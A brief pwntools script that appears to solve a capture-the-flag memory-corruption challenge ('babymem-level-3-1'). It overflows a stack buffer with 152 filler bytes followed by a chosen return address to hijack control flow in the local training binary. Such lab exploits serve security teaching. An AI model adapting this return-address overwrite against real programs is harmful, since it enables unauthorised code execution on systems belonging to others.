from pwn import *

proc = process('/challenge/babymem-level-3-1')
proc.recv()
proc.sendline(b'160')
# 152 offset to RET
proc.recv()
payload = b'A' * 152 + p64(0x401adc)
proc.sendline(payload)
print(proc.recv())

